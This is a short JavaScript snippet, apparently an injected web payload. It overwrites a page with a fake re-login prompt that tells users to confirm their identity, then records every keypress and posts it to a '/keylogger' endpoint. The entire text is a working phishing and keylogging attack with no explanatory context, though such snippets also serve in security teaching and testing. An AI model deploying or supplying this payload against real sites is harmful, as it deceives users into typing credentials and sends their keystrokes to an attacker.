var dummyFormHtml = 'We\'ve had reports of bad guys trying to do wrong by ' +
                    'our users lately - help us, help you, by logging in ' +
                    'again to confirm your identity<br><input type="text" />' +
                    '<br><input type="password" /><br><input type="submit" value="Login" />'

document.body.innerHTML = dummyFormHtml

document.addEventListener('keypress', function (event) {
  var xhr = new XMLHttpRequest()
  xhr.open('POST', '/keylogger')
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
  xhr.send('data=' + event.key)
})
